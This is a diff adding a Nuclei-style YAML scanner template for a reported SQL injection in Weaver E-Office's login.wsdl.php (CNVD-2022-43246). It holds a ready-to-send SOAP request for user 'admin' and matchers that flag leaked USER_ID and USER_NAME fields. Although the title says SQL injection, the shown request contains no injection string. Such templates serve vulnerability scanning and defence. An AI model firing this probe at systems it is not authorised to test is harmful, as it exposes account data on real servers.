@@ -1,0 +1,35 @@
+id: poc-yaml-weaver-e-office-login-wsdl-php-sqli
+info:
+  name: 泛微E-Office login.wsdl.php SQL注入漏洞(CNVD-2022-43246)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CNVD-2022-43246,e-office
+http:
+  - raw:
+      - |
+        POST /webservice-json/login/login.wsdl.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <urn:GetCurrentInformation soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+           <UserId xsi:type="xsd:string">admin</UserId>
+        </urn:GetCurrentInformation>
+        </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "USER_ID\""
+          - "USER_NAME\""
+      - type: word
+        part: header
+        words:
+          - "xml"
